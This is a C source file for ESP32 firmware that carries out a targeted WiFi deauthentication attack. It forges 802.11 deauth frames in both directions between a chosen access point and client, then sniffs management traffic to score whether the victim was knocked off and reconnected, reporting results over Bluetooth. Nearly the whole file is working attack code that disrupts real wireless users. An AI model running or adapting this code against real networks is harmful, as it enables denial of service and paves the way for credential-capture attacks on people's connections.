#include "test_deauth.h"

static const char *TAG = "TEST_DEAUTH";

// Statistics effectiveness
static deauth_effectiveness_t effectiveness_stats = {0};
static bool monitor_mode = false;
static uint8_t monitoring_phase = 0; // 0=baseline, 1=attack, 2=post-attack

// Callback to monitor packets
static void IRAM_ATTR wifi_sniffer_packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!monitor_mode) return;
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint8_t frame_type = frame[0];

    // ======= RETRIEVE DATA =======
    uint8_t attack_channel = deauth_get_attack_channel();
    const uint8_t *target_client = deauth_get_client_target();
    
    // Vérifier si c'est sur le bon canal
    if (pkt->rx_ctrl.channel != attack_channel) return;
    
    switch (frame_type) {
        case 0xB0: // Authentication frame
            if (monitoring_phase == 0) {
                effectiveness_stats.auth_baseline++;
            } else if (monitoring_phase == 2) {
                effectiveness_stats.auth_post_attack++;
                
                // Check whether it is the client target
                if (memcmp(&frame[10], target_client, 6) == 0 || 
                    memcmp(&frame[4], target_client, 6) == 0) {
                    ESP_LOGI(TAG, "Auth from TARGET client detected!");
                    BleManager_SendStatus("LOG|DEAUTH|msg=Target reconnecting!");
                }
            }
            break;
            
        case 0x20: // Reassociation Request
        case 0x00: // Association Request
            if (monitoring_phase == 2) {
                effectiveness_stats.reassoc_post_attack++;
            }
            break;
            
        case 0x40: // Probe Request
            if (monitoring_phase == 2) {
                effectiveness_stats.probe_req_post_attack++;
            }
            break;
            
        case 0xC0: // Deauth
            if (monitoring_phase == 2) {
                effectiveness_stats.deauth_post_attack++;
            }
            break;
    }
}

static void start_monitoring(void) {
    monitor_mode = true;

    // Get attack channel
    int attack_channel = deauth_get_attack_channel();
    
    // Configure promiscuous mode
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_packet_handler);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "Monitoring started on channel %d", attack_channel);
}

static void stop_monitoring(void) {
    monitor_mode = false;
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG, "Monitoring stopped");
}

static void analyze_effectiveness(void) {
    ESP_LOGI(TAG, "\n========== DEAUTH EFFECTIVENESS ANALYSIS ==========");
    ESP_LOGI(TAG, "Deauth packets sent: %lu", effectiveness_stats.deauth_sent);
    ESP_LOGI(TAG, "Baseline auth frames: %lu", effectiveness_stats.auth_baseline);
    ESP_LOGI(TAG, "Post-attack auth frames: %lu", effectiveness_stats.auth_post_attack);
    ESP_LOGI(TAG, "Post-attack reassoc frames: %lu", effectiveness_stats.reassoc_post_attack);
    ESP_LOGI(TAG, "Post-attack probe requests: %lu", effectiveness_stats.probe_req_post_attack);
    ESP_LOGI(TAG, "Post-attack deauth frames: %lu", effectiveness_stats.deauth_post_attack);
    
    // Score calculation
    int score = 0;
    float ratio = 0.0f;
    
    // Ratio aumentation auth frame
    if (effectiveness_stats.auth_baseline > 0) {
        ratio = (float)effectiveness_stats.auth_post_attack / effectiveness_stats.auth_baseline;
    } else if (effectiveness_stats.auth_post_attack > 0) {
        ratio = 999.0f; // no activity before baseline but activity after
    }
    
    // Scoring
    if (effectiveness_stats.auth_post_attack > 0) score += 3;
    if (effectiveness_stats.reassoc_post_attack > 0) score += 2;
    if (effectiveness_stats.probe_req_post_attack > 2) score += 1;
    if (ratio > 3.0f) score += 2; // Significant aumentation
    
    effectiveness_stats.effectiveness_score = (float)score / 8.0f * 100.0f;
    
    // Result
    char verdict[64];
    if (score >= 5) {
        strcpy(verdict, "[v] LIKELY SUCCESSFUL");
        effectiveness_stats.likely_successful = true;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    } else if (score >= 3) {
        strcpy(verdict, "[~] POSSIBLY SUCCESSFUL");
        effectiveness_stats.likely_successful = false;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    } else {
        strcpy(verdict, "[x] LIKELY FAILED");
        effectiveness_stats.likely_successful = false;
        ESP_LOGI(TAG, "Result: %s (score: %d/8, %.1f%%)", verdict, score, effectiveness_stats.effectiveness_score);
    }
    
    ESP_LOGI(TAG, "Auth increase ratio: %.2fx", ratio);
    ESP_LOGI(TAG, "===================================================\n");
    
    //Send result
    char result[256];
    snprintf(result, sizeof(result), 
        "LOG|DEAUTH|msg=Effectiveness: %s (%.0f%%) - Auth:%lu Reassoc:%lu",
        verdict, effectiveness_stats.effectiveness_score,
        effectiveness_stats.auth_post_attack,
        effectiveness_stats.reassoc_post_attack);
    BleManager_SendStatus(result);
}

static void deauth_with_test_task(void *vParameters) {
    ESP_LOGI(TAG, "\n========== STARTING EFFECTIVENESS TEST ==========");

    // Get target ap and client
    const uint8_t *target_ap = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();

    snifferActive = true;
    deauthActive = true;
    isAttackActive = true;
    
    // Reset stats
    memset(&effectiveness_stats, 0, sizeof(deauth_effectiveness_t));
    
    // PHASE 1: Baseline monitoring
    ESP_LOGI(TAG, "Phase 1: Baseline monitoring (2s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 1: Baseline monitoring...");
    monitoring_phase = 0;
    start_monitoring();
    vTaskDelay(pdMS_TO_TICKS(3000));
    stop_monitoring();
    
    ESP_LOGI(TAG, "Baseline: %lu auth frames detected", effectiveness_stats.auth_baseline);
    
    // PHASE 2: Attack
    ESP_LOGI(TAG, "Phase 2: Deauth attack (3s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 2: Sending deauth packets...");
    monitoring_phase = 1;
    
    send_deauth_packets_timed(target_ap, target_client, 5000); // milli
    
    ESP_LOGI(TAG, "Attack phase complete");
    
    // PHASE 3: Post-attack monitoring
    ESP_LOGI(TAG, "Phase 3: Post-attack monitoring (5s)...");
    BleManager_SendStatus("LOG|DEAUTH|msg=Phase 3: Monitoring responses...");
    monitoring_phase = 2;
    vTaskDelay(pdMS_TO_TICKS(500)); // laps before monitoring
    start_monitoring();
    vTaskDelay(pdMS_TO_TICKS(8000));
    stop_monitoring();
    
    ESP_LOGI(TAG, "Post-attack: %lu auth, %lu reassoc, %lu probe req", 
             effectiveness_stats.auth_post_attack,
             effectiveness_stats.reassoc_post_attack,
             effectiveness_stats.probe_req_post_attack);
    
    // PHASE 4: Analysis
    analyze_effectiveness();

    snifferActive = false;
    deauthActive = false;
    isAttackActive = false;
    
    // Cleanup
    isAttackActive = false;
    deauth_set_task_handle(NULL);
    vTaskDelete(NULL);
}

void send_deauth_packets_timed(const uint8_t *ap_mac, const uint8_t *client_mac, uint32_t duration_ms) {
    // Get attack channel
    int attack_channel = deauth_get_attack_channel();

    ESP_LOGI(TAG, "Sending deauth bursts for %lu ms on channel %d", duration_ms, attack_channel);
    ESP_LOGI(TAG, "AP: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    // Prepare WiFi for injection
    prepare_for_injection();

    // Timer
    unsigned long start_time = esp_timer_get_time() / 1000; // milli
    unsigned long elapsed = 0;

    // Variables for deauth attack
    uint8_t packet[26];
    esp_err_t ret;
    int total_count = 0;
    int success_count = 0;
    int retry_count = 0;
    const int MAX_RETRIES = 3;
    
    // Boucle limitée dans le temps
    while (deauthActive && elapsed < duration_ms) {
        // Send burst of 3 packets with retries on failure
        for (int burst = 0; burst < 3; burst++) {
            // ===== AP -> Client deauth =====
            memcpy(packet, deauth_frame, sizeof(deauth_frame));
            memcpy(&packet[4], client_mac, 6); // Destination: CLIENT
            memcpy(&packet[10], ap_mac, 6); // Source: AP
            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            vTaskDelay(pdMS_TO_TICKS(10));
            
            // ===== Client -> AP deauth =====
            memcpy(&packet[4], ap_mac, 6); // Destination: AP
            memcpy(&packet[10], client_mac, 6); // Source: CLIENT
            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        // Longer delay between bursts
        vTaskDelay(pdMS_TO_TICKS(500));
        
        // Update elapsed time
        elapsed = (esp_timer_get_time() / 1000) - start_time;
        
        // Log progress every 10 bursts
        if ((total_count + 1) % 10 == 0) {
            ESP_LOGI(TAG, "Progress: %d bursts, %d packets sent (%lu ms elapsed)", 
                     total_count + 1, success_count, elapsed);
        }
        total_count++;
    }

    effectiveness_stats.deauth_sent = success_count;
    
    ESP_LOGI(TAG, "Timed attack complete: %d packets sent in %lu ms", 
             success_count, elapsed);
    
    // Restore original WiFi state
    vTaskDelay(pdMS_TO_TICKS(200));
    restore_wifi_state();
}


void start_deauth_with_effectiveness_test(char *target, char *ap, int channel) {
    // Get deauth task handle
    TaskHandle_t deauth_task_handle = deauth_get_task_handle();

    if (deauthActive) {
        ESP_LOGW(TAG, "Deauth already running");
        return;
    }
    
    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task already exists");
        return;
    }
    
    uint8_t target_mac[6];
    uint8_t ap_mac[6];
    
    if (!mac_str_to_bytes(target, target_mac) || !mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid MAC format");
        return;
    }
    
    set_deauth_targets(ap_mac, target_mac);
    set_deauth_channel(channel);
    
    xTaskCreate(
        deauth_with_test_task,
        "deauth_test_task",
        8192,
        NULL,
        5,
        &deauth_task_handle
    );
    
    ESP_LOGI(TAG, "Deauth effectiveness test started");
}